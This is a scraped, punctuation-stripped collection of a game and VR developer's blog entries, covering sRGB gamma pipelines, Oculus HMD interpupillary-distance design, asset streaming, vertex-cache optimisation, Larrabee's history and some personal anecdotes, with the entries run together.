srgb linear answer case srgb technically also includes final framebuffer given choice linear format srgb format srgb much much closer match response real monitor linear however even better app performs explicit tonemapping step match gamma response monitor precisely since mentioned srgb gamma slightly different result backwardcompatibility reason os expect apps provide buffer declared linear format buffer contain gammaspace data special case extremely counterintuitive many people cause much confusion think linear buffer format contain gammaspace data tried create srgb higherprecision framebuffers see o one option still assumes gamma space monitor another would assume really linear space especially floatingpoint data apply ramp thereabouts processing would interesting experiment aware result obvious oculus rift support oculus rift desktop support srgb buffer somewhat different standard o support unlike fullscreen display monitor application supply framebuffer directly applied head mounted display instead app supply buffer distortion chromatic aberration bunch postprocessing operation applied sdk oculus display service shown hmd oculus careful quality calibration display service know great deal hmd characteristic apply precise gamma ramp part distortion process buffer supplied app must filtered blended part distortion chromatic aberration processing filtering math important data buffer linear space gamma space math correctly linear space starting version oculus sdk expects application supply data linear space whatever format buffer declared display service apply required filtering distortion apply precise gamma curve match actual response hmd know precise characteristic display also play various trick extend precision little support standard image format including input buffer nt afraid feed u hdr data mean application need know exact gamma response hmd excellent mean application get surprise used o accepting buffer declared linear buffer silently interpreting data gammaspace whatever gamma monitor set buffer declared linear buffer display service take application literally interprets data indeed linear space producing image typically far brighter expected application fully gammaaware applying gamma curve postprocess solution simple nt leave data linear space shader apply gamma ramp tonemapping brightness correction fine remove lineartogamma part write data srgb hdr surface preserve lowend precision display service rest important remember using srgb surface gamma space still surface data linearspace representation memory look similar gamma curve application gammaaware happily naively using gamma data throughout entire shader pipeline forever solution tiny bit complex application us srgb buffer creates rendertarget view pretend buffer linear us write allows shaders continue produce gammaspace data way always rendertarget view set linear remapping performed writing surface gammaspace data go directly memory display service read data interprets srgb data srgb close gamma representation work almost perfectly display service read gammaspace data hardware convert linearspace filtering blending happens process also explained oculus sdk doc hack work well much simpler converting application use fully gammaaware pipeline start end alternative srgb srgb great format limited bit per channel want little precision subject could occupy blog post might well future brief list interesting alternative simple robust excellent api platform support sadly significantly larger cause performance problem linear look promising however note le precision dark area srgb fact low end srgb line slope effectively extra precision making almost good linear gamma us standard format apply gamma manually shader squaring data reading taking square root writing give significantly higher precision srgb throughout range however square squareroot done shader texture filtering alphablending work correctly may still acceptable use case similar smaller le accurate note unlike store negative number used look useful sort data srgb store lumachroma buffer really advanced topic lot variant one example transforming data ycgco storing higher precision cg co filtering alpha blending may work correctly without effort crossplatform support desktop pretty simple although srgb support introduced previous version finally required full correct fast support result useful graphic card shipped since pc mac included excellent srgb support realworld purpose regard support free nt know detail nintendo hardware xbox one highquality srgb support pc counterpart srgb conversion alphablending blending done gamma space quite right notorious really terrible approximation srgb better linear totally differentshaped response actual srgb required special authoring step avoid significant artefact mobile john carmack informs adreno mali high quality small perf penalty adreno note none newer one unlike mobile part permitted perform srgb conversion texture filtering rather raw texel filtering much cheaper hardware cause slightly incorrect result unclear part actually take shortcut something watch also note oculus mobile sdk handle srgb slightly differently desktop check deocs detail simple rule follow making pipeline srgbcorrect image format display monitor without processing eg mspaint browser almost certainly either gamma srgb space mean gifs jpegs pngs tgas bmps etc true anything artist made coming paint package time storing thing look like picture bit per channel use srgb give much le banding dark area always use hardware decompress linear anything mathslike data eg shader time storing thing mathy eg lookup table normal map material id roughness map use linear format rare srgb compression want without deeper thought lightmaps shadowmaps interesting case like picture opinion differ experimentation may required similarly specular map srgb may may want depending context content keep pipeline flexible try way floatingpoint format conceptually linear conversion needed use value math immediately however way float encoded give many precision advantage gamma format safely store thing look like picture floating point format get higher precision darker area conclusion hopefully given overview occasionally confusing world srgb gammacorrect rendering worry still get confused time know right lingo forever correcting others real pedant persistence pay end robust controllable colour response curve suddenly strange thing bright dark area vr used wellcalibrated hmd display software carefully controlling colour space data pipeline give user convincing realistic experience louise forsyth nee rutter darling wife dear please stop peering shoulder coming anniversary together past year married living sin fun conventional last meant vet u authoritays nt realise uk cat dog uncannily similar u cat dog want pas exam mum told cambridge degree key unlocked world believed fuck mum dad hiking bloghttp eelpilivejournalcom gorgeous picture surrounding countryside volcano rock quite literally tom forsyth pretty much permanently tomf though even write email people like parent wife started muckyfoot second tom join tom ireland already nabbed tom muckyfootcom make tomf muckyfootcom however tom ireland would get constant stream mail meant started make point always signing tomf hope people would remember add f partly worked habit kinda stuck course worked tom fletcher intel put spanner work tomf oculus back normal main url site http eelpigotdnsorg go redirects whatever isp paying money year nt use whatever address see browser bar stick one coz move around emailme tweetme surname noe work oculusvrhttp wwwoculusvrcom work virtual reality hardware softwarehttp disambiguation tomforsythhttp twittercomtomforsyth tom forsyth various gamerelated programming mailing list tom forsyth written edited programming book article tom forsyth talked gdc tom forsyth worked muckyfoot radgametools intelhttp wwwintelcom valvehttp wwwvalvesoftwarecom tom forsyth worked urban chaos startopia blade ii larrabee team fortress vrhttp tom forsyth andrew forsyth various patent processor tech larrabee tom forsyth microsoft mvp tom forsyth worksworked nokia tom forsythehttp wwwtomforsythecom take photo naked barbie doll thomas forsythhttp wwwthomasforsythcouk make furniture tom forsythhttp enwikipediaorgwikitomforsyth scored winning goal scottish cup final knowingly related famous forsyth forsythe frederick bruce john etc aka tomf http eelpigotdnsorg talking someone simple ingame lighting model day realised totally different terminology bunch lighting trick independently invented instinctive loathing reinventing wheel wondered happened reason lighting trick simple nt warrant proper paper book article gdc talk never get passed along others thought write light type using call trilight seen anyone else talk simple sure others invented least happy documented papershttp wwweelpigotdnsorgpaperspapershtml page got simple demo go way really satisfying write small demo short paper start finish half day change normally tackle big problem like shadowing take month code lot explanation excellent way spend sunday afternoon people try tomforsythhttps twittercomtomforsyth tweet harder supposedly famous four yorkshiremen sketch monty python reproduced entirety make easier cut npasting thewife kill describe yorkshireman yorkshire side fucking hill wellbroughtup midlander able instantly tell authentic estuaryfenland accent lancashire amusing anecdote another time meanwhile pop stack primary anecdote player michael palin first yorkshireman graham chapman second yorkshireman terry jones third yorkshireman eric idle fourth yorkshireman scene four welldressed men sitting together vacation resort farewell thee played background hawaiian guitar first yorkshireman aye passable passable bit risotto second yorkshireman nothing like good glass château de chasselas eh josiah third yorkshireman right obadiah fourth yorkshireman thought thirty year ago sittin drinking château de chasselas eh first yorkshireman day glad price cup tea second yorkshireman cup cold tea fourth yorkshireman without milk sugar third yorkshireman tea first yorkshireman cracked cup fourth yorkshireman oh never cup used drink rolled newspaper second yorkshireman best could manage suck piece damp cloth third yorkshireman know happy day though poor first yorkshireman poor old dad used say money nt buy happiness son fourth yorkshireman aye e right first yorkshireman aye e fourth yorkshireman happier nothin used live tiny old house great big hole roof second yorkshireman house lucky live house used live one room twentysix u furniture alf floor missing uddled together one corner fear falling third yorkshireman eh lucky room used live corridor first yorkshireman oh used dream livin corridor would ha palace u used live old water tank rubbish tip got woke every morning load rotting fish dumped u house huh fourth yorkshireman well say house hole ground covered sheet tarpaulin house u second yorkshireman evicted ole ground ad go live lake third yorkshireman lucky lake hundred fifty u living shoebox middle road first yorkshireman cardboard box third yorkshireman aye first yorkshireman lucky lived three month paper bag septic tank used get six morning clean paper bag eat crust stale bread go work mill fourteen hour day weekin weekout sixpence week got home dad would thrash u sleep wi belt second yorkshireman luxury used get lake six oclock morning clean lake eat handful ot gravel work twenty hour day mill tuppence month come home dad would thrash u sleep broken bottle lucky third yorkshireman well course tough used ave get shoebox twelve oclock night lick road clean wit tongue two bit cold gravel worked twentyfour hour day mill sixpence every four year got home dad would slice u two wit bread knife fourth yorkshireman right get morning ten oclock night half hour went bed drink cup sulphuric acid work twentynine hour day mill pay mill owner permission come work got home dad mother would kill u dance graf singing hallelujah first yorkshireman try tell young people today wo nt believe wo nt geek culturehttp appleslashdotorgcommentspl fantastic attentive noticed phrase uphill way fact appear sketch fairly cursory bit research reveal fairly similar entirely unrelated bill cosby sketch bill cosby native yorkshireman lot people know released pc dreamcast joined muckyfoot pc version finished nt much game got lot neat stuff enjoyed playing dreamcast port pc version shipped karl zielinski testing nine month start finish dreamcast really nice machine work meant without fuss big contrast drama version going shame dc died nice elegant bit kit utah teapotahedronhttp wwwicsucieduarvoimageshtml awesome demo model easily recognisable easy tell screwed scaling clamping nl wrong way managed get backface culling wrong got instacreate function spline data easily available see steve baker excellent homage pagehttp wwwsjbakerorgteapot area type curvature project shadow onto really nicely handle spout lid handle easy throw texture map onto apart pole lid easy parameterise also help pet gripe mine algorithm require nonintersecting watertight manifold teapot closed selfintersects handle punch side really useful pounding algorithm nt like either getting artist generate watertight manifold horrible job please could researcher stop developing algorithm require algorithm nt even handle sixth platonic solid much use anyone frankly reason lennahttp wwwlennaorg better icon computer graphic around longer naked keep stupid conversation people go little something like need get new card one dualdvi idea really need dual dvi yeah vga shit vga actually pretty good know running sort crazy re yeah blurry mess crazy well within vga capability analogue crap anything like go digital especially reading text dude home run iiyama crt vga cable write code day black text white background work run second samsung vga cable well screen use email black white crystalsharp rubbish tried unreadable blurry mess even chance using nvidia graphic card sure go got ninja bastard card elderly perfectly standard radeon got gt kick shit yes shuffling pixel got nvidia ramdac large steaming pile poo seriously hell nvidia ramdacs shit right day one shit worked infinitely superior display quality topend continued grand tradition right current card acceptable rivatnt cost asking sli rig bos trying get two monitor hooked fancy nvidia card one dvi port whichever monitor plugged vga port ghosting like crazy swap card cheap nofrills radeon hey lovely picture going think ati fanboi like elegant orthogonal hardware syaing ati ramdacs great nt suck matrox intel decent ramdacs even powervr zombie better ramdacs beaten absurd example colleague highspec desktop replacement laptop nvidia chipset sort could never get drive cheap crt halfreadable text naturally blamed monitor recently replaced new dell drive crt wonderfully intel graphic chip laptop totally worthless card even order magnitude better nvidia card running crt one time nvidia card decent ramdacs someone else multi medium card fancy tv inout stuff nice external ramdac made someone else apparently never tried work fine new tech bounced switching dvi bogus reason monitor size nt growing fast someone tell old steampowered analogue vga totally obsolete dvi quality sooooo much better ask got nvidia graphic card added version vipm comparison article website paper sectionhttp wwweelpigotdnsorgpaperspapershtml bottom always nice article alive searchable engine added hindsight process integrating vipm blade since article written done bunch thing people vr industry know either forget know find complex talk publicly result poorly understood public discussion thought try share warned opinion still somewhat contentious everyone agree part nature vr nobody really know work yet certainly always disagreement research rather long post started journalist called chris bratt wrote asking research heard done ipd distribution malefemale difference topic irritates many way particularly people call stuff research absolutely fails even basic standard robust research case calling research laughable let explain actually valve early day vr investigation around trying match intercameradistance icd user actual interpupillarydistance ipd provide accurate feeling scale mechanical system graphic display adjusted controller seemed work average ipds people vr group wanted test folk long tail ipd bellcurve went wandering hall valve looking outlier people wide narrow ipds obviously idea robust research go window throwing metersided square canteen sampling everyone fall inside square actively looking outlier surprising little practice take able gauge people ipds looking square face second wander hall go room people working go person say excuse turn look stare second mostly say boring thanks totally weird valve surprisingly large place lot people try since explicitly looking outlier save time instead focused large men small woman logically outlier would right except nt work small woman roughly normalsized head even small head nt necessary eye close together large men nt usually large head even time eye widely spaced surprised lot correlation height head size absolutely obvious indeed person found narrowest ipd entire office otherwise perfectly normallyproportioned man otherwise unremarkablysized head repeat none even remotely research sample size tiny exactly zero randomisation done deliberately looking outlier ignoring middle obvious thing absolutely least obvious way lesson even basic assumption vr laugh particular variance within specific subpopulation men woman tall short old young usually much larger difference mean interwhatdistance ipd hugely overused term vr whole bunch different thing talk different term official term made need call something interocular distance iod fixed distance center user eyeball interpupillary distance ipd instantaneous distance center user pupil varies vergence interaxial distance iad optical axis separation distance optical centre lens hmd intercamera distance icd virtual camera separation vcs inapp distance virtual camera used rendering left right view last two term universal term shall use pedantic since going talk four thing relationship various time important precise make sure talking right one also note word vergence usually convergence eye pointing towards look nearby object shrink interpupillarydistance course interoculardistance however people walleye divergence eye pointing away general term simply vergence find amusing one mostly care vr change constantly one actually called ipd people vr mostly mean talk ipd fact interoculardistance iod nt change time according vergence however hard measure directly find middle eyeball usually measure ipd zero vergence ie looking object infinity note optometrist measure ipd always stated distance sometimes given meter sometimes diopter piece paper optometrist ipd somewhere also say distance measured important example getting glass specifically reading measure ipd vergence use reading size eyeball one thing fascinating human eyeball almost exactly size radius astonishing degree accuracy nature le variance think huge variation size human body part eyeball almost exactly size small variance correlation age height gender ethnicity anything else anybody find reason optical physic work eyeball nt exact correct size ca nt see properly precise feedback mechanism make sure eyeball grow exact correct size also child big eye quickly grow right size part body see age eyeball radius fullgrown age consistent eyeball size great designing vr headset course one le thing measure fixed size easily calculate much vergence affect ipd since lot vr game involve looking thing pick manipulate actual hand important important well let imagine tend manipulate thing suspiciouslyprecise face let say man average interocular distance according army survey data wikipedia mm looking object away eye laterally one ie middle line nose eyeball rotated inwards atan degree since radius physical sideways movement sin eyeball moved far ipd looking closer object course carefully chose wikipediasupplied average woman ipd mean even completely nonadjustable hmd optical quality experienced average woman looking mountain experienced average man looking something holding hand ipd eye box established pupil move significantly looking closeby object looking around scene real vr quantify eyeball size pretty simple eyeball comfortably routinely move degree offaxis normal use move rare usually instead turn head ca nt move eyeball upwards quite far move downwards let ignore still roughly degree degree offcenter sin let call nice number sidetoside eyeball note pupil also move backwards let call imagine area space eyeball travel wide deep optical folk refer eyebox really box shape course well term guess stuck optical system also eyebox shape pupil move inside still get good arbitrary definition image ever used binoculars microscope highzoom rifle scope know device tiny eyebox hold face even small motion eyeball make image degrade various way focus brightness vanishes altogether lowerpower device magnifying glass reading spectacle much larger eyebox make easier use give wider field view trick vr device give user optical eyebox match real eyebox difficult vr headset nt quite get quality image gradually degrades towards edge center surprisingly good interesting compare range motion eyeball normal use variance iod reminder iod separation middle eyeball pupil person eyebox previously calculated around side side deviation midline range iods population according wikipedia data taken army survey woman men also however misleading deviation average midline eyeball actually quarter quick sanitycheck average iod moving eyeball outwards give iod eyeball move inwards give amount pupil movement involved looking around normally twice large range iods hmds need cope course thing cumulative person narrow iod also able look around scene point iod variance major cause pupil movement using vr another conclusion interesting consider even headset ipd adjustment correctly optical axis separation adjustment critical optical reason get perfectly match user iod millimeter may ok pupil move significantly millimeter normal use anyway collimated image counterintuitive people surely lens perfectly aligned eyeball picture displaced lens close eye even small offset obvious right nt case special way lens work vr lens produce almost collimated image collimated mean light ray particular bit information eg single pixel parallel wherever come lens whole lens area see light ray single pixel exit lens parallel absolutely mindblowing thing try get head around worked vr year still ca nt really visualise important thing eyeball anglemeasuring device see light ray passing single point pupil measure angle colour light ray since light given pixel parallel travel angle mean wherever put pupil front lens single pixel light hit pupil angle translating pupil around nt change angle light ray mean image nt move point vr optic expert sometimes even yelling screen telling fool course image move obvious try experiment find fixed test pattern put hmd screen pull hmd away face little move side side inch nt rotate translate image stay fixed space really strange thing moving physical box image inside move power collimatedlight image still unintuitive even though understand physic math well course real vr lens perfectly collimated various reason close enough getting iad optical axis separation adjustment perfectly right important appears first think back far pupil move look around scene good thing image distorted wildly looked around would bad fundamental reason vr headset produce collimated image optical device want give wide field view let look around mean allowing pupil roam around eyebox virtual separation iod actually important spent lot word trying convince exactly measuring matching iod nt important ipd change much dynamically anyway addressing question optical clarity much important reason want measure user iod precisely human use whole lot interconnected cue determine motion head orientation relative environment one important one stereoscopy parallax motion head move around inner ear semicircular canal slosh neck muscle react weight head eyeball rotate counteract vor vestibulo ocular reflex lot vr talk elsewhere image move across retina trigger motion detector data go brain correlated together mismatch one bit data tend get nausea one way get absolute sense scale looking comparison vergence eye looking specific object compared iod use distance eye fixed measuring stick world important virtual icd distance ingame camera match real physical iod otherwise virtual world seem larger smaller really actually cool effect way inherently problem move camera apart make world seem smaller move closer together make world feel larger change virtual camera separation icd becomes problem move head sidetoside causing parallax motion rather parallax displacement iod two nt match brain get confused discomfort nausea specifically translate head sideways distance iod left eyeball seeing right eyeball seeing nt brain worry something bad happened make feel bad note scale move virtual camera closer together reduce ingame motion camera due head motion everything totally fine world grew shrank magically still work nt get nausea bunch demo quite experience actually uncomfortable would think would make player feel larger smaller people report feel size world change size around want make player feel taller need move camera upwards outwards anyway hmd tracking system know far head moving absolute unit virtual icd set wrong stereoscopy wo nt match comfort problem key thing iod important literally user iod hmd lens iad important except get decent image see something course even physical ipd really iad adjustable hmd wo nt exactly reach user actual iod close enough let see decent image still need way adjust virtual icd ingame camera match user iod rather hmd good news virtual icd completely controllable number code reason correspond physical iad headset even physically plausible two big problem know user iod even measure without going optometrist vr software seen iodicd override assumes physical iad headset match user iod may true note override driver software like steamvr oculus runtime nt every game one obvious caveat big chunk population poor stereoscopy figure place number seen much people ca nt see stereo well eye work fine machinery form composite image depth nt people get depth cue moving head seeing parallax change single eye rather correlating parallax eye almost efficient true stereoscopy plenty worldclass flying ball game player cricket baseball soccer etc see one eye get depth cue head motion still careful talking catching ball talking discomfort different thing totally plausible someone terrible stereo vision eg extreme walleye two fovea ca nt physically point object might nevertheless get discomfort virtual icd match physical iod personally believe mismatch factor iod virtual icd much larger cause discomfort general vrusing population physical one iod iad ie lens positioning however also far le wellknown mismatch problem also le obvious wrong lens significantly see picture look kinda crappy unless lens designer amazing virtual icd people wo nt immediately notice actually astonishing often developer accidentally switch left right eye code effectively icd negative rather positive take age consciously notice ever subconscious notice end sick wo nt know physical hmd constraint hmd designer constantly work make eyebox device large possible trade clarity distortion whole bunch factor one strong reason opticalaxis adjustment minimise size eyebox needed seen nt help much would hope iod variance significantly smaller inherent motion pupil looking around adding opticalaxis adjustment add weight complexity cost design three cause problem extra weight mean headset le comfortable use people may mean feature need removed keep weight complexity problem adjustment may desirable example adjustable eye relief may prohibitively difficult build device adjustment eye relief optical axis separation cost problem device cost fewer people afford buy exclusive vr remains interesting note oculus gone backandforth question fixed iad eyerelief adjustment nt good eyerelief adjustment mechanism fragile constantly popping place hey devkits first version rift added iad adjustment result remove eyerelief adjustment make mechanism practical successor rift switched back fixing iad allowing eyerelief adjustment user asked supply icd setting manually sadly original rift hardware iad adjustment appears path override hardware setting iod steamvr setting steamvrvrsettings file called ipdoffset appears meter effect apparent world scale actually practice unclear relative hardwarereported iad pereye sum eye asymmetry positive outwards inwards experimentation required important understand vr hmd design incredibly difficult nobody really know work lot time barely work every single decision cost money weight complexity way make headset work everyone always people excluded design make complex heavy people wear also excludes people expensive make people enough money buy also exclusionary simply get away fact every decision excludes portion population make tradeoff consciously deliberately know excluding would take include back turn would get excluded decision design decision take age endless meeting demographic table looking population bell curve think right solution note least time writing longer work vr company opinion know sure one universally even widely shared take hint oculus valve htc vr company think first easiest part allow people biometric profile inside oculushomesteamvr store iod standing sitting height specifically distance eyeball ground standing sitting usual chair iod measured lens adjustment manual override eg ask optometrist everyone eye test every year ask standing sitting height measured putting headset ground putting standing sitting calibration done software hardware use give accurate sense scale possible put ground real foot additionally hmd interaxial lens adjustment software help guide user adjust lens appropriately within constraint hardware believe hardware iad guide software icd particularly useful feature difficult set iad match iod visual cue alone determine virtual icd sufficient accuracy avoid nausea general much robust measure iod fixed number software software help set hardware iad match case got bumped someone else used headset profile per person also make much simpler share hmd within family friend person named profile measurement matter privacy biometric profile store simple data clear text inspect need second part hmd maker prioritise good eyerelief adjustment iad adjustment single device complex opinion close repeatable eyerelief far bigger influence optical quality iad adjustment issue eye relief every face different put hmd face distance lens pupil pretty arbitrary however unlike iod ca nt build hmd use average eyerelief distance population lens shoved eyeball suboptimal instead build hmd percentile population mean suck almost everybody instead allow user move lens close eye tolerate typically length eyelash around get best fov physically possible lens designer design thin eyebox lens produce degree fov eyerelief produce whopping degree fov additionally consistently thin eyebox every user adjusts consistent distance away turn powerful allow lot optical freedom ax create better experience regard eyerelief adjustment far important iad adjustment third part going iad adjustment headset simpler requirement iad adjustment continuous easy adjust symmetrical perfectly ok lens position adjustment require taking headset putting lens one n discrete position way preferable position simply numbered repeatable putting slightly different position time put headset five position per eye cover range iod population increment position per eye mean possible width moving one eye moving hmd sideways mean nobody eyeball away centre lens plenty precision allowing asymmetry also important people nose exactly midway eye keeping mechanism simple make eyerelief iad adjustment single device practical forth part many headset wellcalibrated camera headset positional sensing passthrough video would love allow user hold hmd front face looking user look spot hmd take picture face figure actual ipd appropriate vergence know user looking point hmd calculates iod put biometric profile convenient alternative going optometrist hope interesting sometimes pedantic trip intricacy far apart eye article construction noticed lot discussion trouble naming various technology word wearable computing group use headmounted display hmd general term sort display fairly rigidly mounted head may one eye eye use wide variety display technology usually form orientation andor position tracking know looking without tracking really private tv let ignore moment virtual reality vr immersed virtual world really nt want see real world would distracting exception call blind phone ring want pause drink cup coffee cat suddenly jump lap want instant easy way able see world probably nt need also see virtual one something crude flipup visor ancient forte would work fine augmented reality ar like vr see virtual world headmounted display display constructed let light real world well usually halfsilvered mirror similar allows virtual information object displayed top real world michael abrash said bloghttp blogsvalvesoftwarecomabrashwhyyouwontseehardaranytimesoon biggest problem occlude real world opacity control mediated reality mr similar ar except instead realworld photon travelling direct eyeball camera turn video stream virtual world get rendered top result displayed eyeball still wearing hmd immersed world significantly simpler ar registration better opacity question whether extra latency resolution loss going camera display path acceptable everyday use would nt want cross street wearing one let alone drive car however obvious way modify vr blind since fairly easy slap camera onto vr headset augmented video av standard term one like like mediated reality video feed add something top show user difference rigidly mounted head may showing portion view ton happening right smart phone really cool buuuuut going curmudgeon complain say real vr order magnitude easier immersive definition vr calling vr give people false hope hey vr iphone ca nt long everywhere maybe year give call vr definition need new name immersive virtual reality maybe woohoo finally got arse wrote paper without editor nagging two week overdue day job mesh preprocessor looking vertexcache optimiser add one knew either complex understand specialcase proprietary written vertexcache optimiser thing lookahead mindnumbingly slow truly awfully slow even lookahead six triangle pathetically slow tried seven nt finish three hour running time thought well one tried writing nolookahead nobacktrack one anything better slap face angry herringstrippers basically made heuristic thought would work behaved scarily well tweaked bit went better wrote thing anneal magic constant went really really well well got within ten percent optimal result compared variety scary excellent paper read really close nt done applestoapples comparison yet eyeballed mammothstoheffalumps comparo looked rather promising order magnitude faster way easier understand eric haineshttp wwwacmorgtogeditorserich asked question gdalgo list much stand wrote thing put herehttp wwweelpigotdnsorgpapersfastvertcacheopthtml intend keep relatively live feedback fire away streaming data disk important figure two thing related slightly different asset like loaded priority priority used decide asset get loaded memory short ca nt load everything one throw away free space also used decide order load thing nt enough disk bandwidth know never enough memory disk bandwidth texture mipmaps determining mipmap need reasonably efficient approximation cover blog entry knowing mipmap level needed could also demandpaging virtual texture example sean sparse virtual textureshttp silverspaceshipcomsrcsvt id rage engine megatextures problem get end similar sort cheap approximation mesh lods use progressive mesh collapse error metric give error realworld distance use artistgenerated lods usually specify screen height pixel model designed viewed sound lods trickier thing fade distance volume correspond quality obvious way minimumvolume cutoff really thing general need sort obnoxiousness level specified sound folk sound lods footstep loaded instead may lowobnoxious change enemy grunt instead significantly obnoxious much fiddling decided two different priority asset one priority currently visible lod whether loaded measure bad stuff look right fail load something like pixelerror metric however tricky measure ballpark practical unit meter away standard game camera much easier empirically tweak display lods side side move camera point nt really notice difference quality biasing texture face logo texture dirt concrete valid thing work well smart charleshttp cbloomrantsblogspotcom automate find psnr difference adjacent mipmap level use bias priority priority one next highest lod visible one one nt yet need one expressed different way many second away player noticing missing rather inverse multiply currentlyvisible lod priority course everything actually visible loaded want prefetch asset fill free space available stuff want load first stuff player able see soonest normally get time dividing distance object player speed player move however locked door way unlockdoor animation take two second play add simple distance measurement long door still locked player actually door start unlocking maybe one second away door point loading anything side matter close asset two entry priority queue one answer question running memory unload make room answer question spare space shall fill two slightly different note texture prove need certain mipmap level given frame literally point loading graphic card touch data mesh lod always theoretically see improvement using higher lod second see difference blur distinction anyway practice every type priority get bunch tweak knob applied spend tweaking look right interesting question measure distance simplest linear distance ignores visibility something side wall get loaded anyway suboptimal end scale virtual texture system theory great load part texture literally visible unfortunately streaming disk need second prefetch useless providing data great lowlatency stuff like decompressing jpeg dxtn uploading video card good deciding load dvd bunch thing discovered along way solved player camping exit baddie smarter sneak behind player hears footstep turn around attack blurry lowpoly monster nt use visible frustum cull use omnidirectional distance distancetoreach determine lods need almost game type spin camera around le time drive head seek exception texture loaded nt case streaming system fallen behind running short memory dontca nt really want given choice loading texture visible right texture b far away nt visible right load texture first one reason separate priority need might need future bias first frustum second player running corridor turn sharp left even stuff nearby blurry using pvs portal system great need modify traversal using streaming visibility way first floodfill player timetogetthere metric eg second travel time unlocking door etc completely ignoring lineofsight lineofsight check portal enlarged visible set ignoring view frustum see problem mean preload visible thing side currentlyclosed door around corner player close etc player blow door open rocket launcher anybody propertydestroying weapon readied assume destructible thing nt visibility traverse player shoot car car seems explode second either car look undamaged car simply nt need link destroyedcarmesh texture intact car mesh one visible make sure assign similar priority could make conditional someone heavy weapon equipped feeling keen player lob grenade something explosion blurry explosion texture load time explosion fading immediately get unloaded doh moment someone throw grenade start loading explosion texture three second need similarly someone pull weapon make sure preload smoke muzzle flash stuff associated weapon hud sometimes blurry eg pause menu rarelyused super power effect etc never unload element ingame hud tried bunch way stream hud take quite lot texture space sucked incredibly obvious get wrong nt bother cutscene two character talking radio camera cutting back forth every time cut texture blurry really difficult game teleportation similarly rapid transport need able throw multiple camera scene vi priority check take highest priority cutscenes need camera playing cutscene several second ahead player seeing cutscene system work modifying game world really hate two cutscenes playing time right answer nt make sure ability multiple world cutscene running course frequently absurdly impractical would take major reengineering way blade ii pretty hacky work compiletime switch recorded camera position cutscenes playing streamed file second compiletime switch would play back file three second lead time vi priority check prescient camera get scenery right example car spawned speed towards stationary camera wo nt work camera right place future car nt second mode remembers filename nt get streamed time max lods point time dump second file merge two file normal build play back file three second ahead obviously redo process every time asset cutscenes change still need record camera may npc environment change dynamically eg looking devastation player wrought behind horrible hack worked well enough ship wiki sort wiki collaborative document really simple editing hyperlinking even idiot like create document lot confusing link random page simplest way make new link writeincamelcapslikethis word seem really stupid learn live le time spend thinking formatting likely deign write peal wisdom likely raised enlightenment lucky people quick guide click blue link open new topic technically called tiddler hover open topic get little toolbar top right list action click close close current topic click close others close everything topic page tag categorise one tag help select tag field far right see list tag browse topic use tag handy want tech stuff lot random ramblings go experiment way harm wiki playing even look like ca nt save change note sortof wiki although look like edit ca nt save edits life server edit ner obviously save harddrive unlikely interesting nobody else see want play real wikis original wikiwikiweb http wikis ultimately descended probably famous wikipedia http enwikipediaorgwikimainpage encyclopedia wiki created geek geek thus contains far pokemon character http enwikipediaorgwikijigglypuff ball gown http enwikipediaorgwikiballgown technicallyminded particular breed wiki tiddlywiki read http wwwtiddlywikicom every month someone ask happened larrabee failed badly try explain nt fail pretty huge success understandably puzzled public consciousness larrabee like itanic spu rolled one nt well quite rather explain person whole bunch time thought write history going skip ton detail brevity one day write whole story pretty decent escapade lot fun character today today get start end say larrabee mean knight mic xeon phi isle card exactly chip people software effort marketing seemed dream new codeword every week ever three chip knight ferry aubrey isle mostly prototype performance gotchas work shipped partner knight corner xeon phi thing actually shipped bulk knight landing new version shipping day mid codenames forgotten year one chip behind marketing smoke mirror three chip ever made far four planned total thing called planned knc knl larrabee whether graphic larrabee originally conceived back called smac original goal least important make powerful flopsperwatt machine realworld workload using huge array simple core system board could built bazillocore supercomputer make core mean memory coherency store ordering memory protection real os ugly scratchpad run legacy code funky dsps windowed register file wacky programming model allowed build another itanium spu make soon mean keeping simple support emerging gpgpu market chip intel absolutely going build pcie card version embedded graphic chip known gen cover programming model bonus run normal graphic well add little graphicsspecific hardware get away ordering important term engineering focus larrabee never primarily graphic card intel wanted kickass graphic card already good graphic team begging allowed build nice big fat hot discrete gpu gen architecture build great one intel management nt want one still nt going build larrabee anyway wanted u cover market well remember around gpgpu starting show could get interesting win real hpc workload plethora kernel style coding language spread normal language like c fortran yes big computing people still use fortran get intel worried existing xeon cpu line nt cutting emerging threat thing like gpgpu sony cellspu sun niagara radical massivelyparallel architecture needed something cpulike program gpulike number crunching power year external message got polluted confused sometimes intentionally admit played part awful lot highly speculative marketing projection ie bullshit issued firm proclamation people talked thing year already chipsw nt help marketing wanted keep larrabee graphic side micknightsxeon phi hpc side separate public consciousness even though exact chip nearly exact board recall physical difference one nt dvi connector soldered onto behind marketing design larrabee cpu wide simd unit designed real grownup cpu coherent cache wellordered memory rule good memory protection true multitasking real thread run linuxfreebsd etc larrabee form knc went become fastest supercomputer world couple year still making ton money intel hpc market designed fighting nicely gpus custom architecture successor knl released right mid nicely space remember knc literally chip texture sampler video port sitting die nt test turn expose software still still graphicscapable part original goal fail let review make powerful flopsperwatt machine success fastest supercomputer world power whole bunch others top big win covered vulnerable market intel made lot money good press make core success compromise full compatibility knfknc nt sse would much work build validate unit remember started original pentium chip knl add sse legacy instruction back really truly proper core fact grew include new instruction set larrabee instruction set encoding change tweak make soon mean keeping simple bad quite simple slapping bunch pentiums chip course nt infeasibly complex either slip year various reason knf performance badly hurt bunch bug thing happen knc almost time turned great support emerging gpgpu market bonus run normal graphic well primary goal virtual success would real success ever shipped larrabee ran compute shaders opencl well many case better flopswatt rival gpus ran graphical bit directx opengl pretty well using graphic apis mainly compute compelling package unfortunately nt graphic anymore order came high got thrown trash rest also kickstart development host gpgpulike programming model ispc cilk plus survive well bonus goal close cigar talk add little graphicsspecific hardware get away moderate success dedicated graphic hardware texture unit took almost totally gen nt reinvent wheel eyeballing die photo took area certainly nt small nt crazyhuge either used power power drain unless using case course massively better texture sampling core small part nobody bothered make new version knc without still sit today visible die photograph thing look like core slightly thinner truth told knc properly graphicsfocused part would thing nt make total make three win one acceptable loss score larrabee hardly failed made intel bunch money much one top dog hpc supercomputer market big core adopted instruction set let talk elephant room graphic yes fail failed mainly reason time politics even nt fail nearly much people think never allowed ship people saw giant crater fact larrabee run graphic ran surprisingly well larrabee emulated fully compliant graphic card mean pcie card plugged machine plugged monitor back installed standard window driver graphic card graphic card system full feature set title running perfectly download game steam work totally think graphic card still actually running freebsd card freebsd running program called directxgfx thread share file system host telnet give work steal core graphic system mindbending software could evolve larrabee first fully card intel unlike gen nt make new chip microsoft released new spec also fastest graphic card intel possibly still course totally unfair comparison gen integrated intel gfx processor far le power area budget still tell larrabee ran graphic perfectly respectable speed got good larrabee course first properly working chip knf sort problem knc first 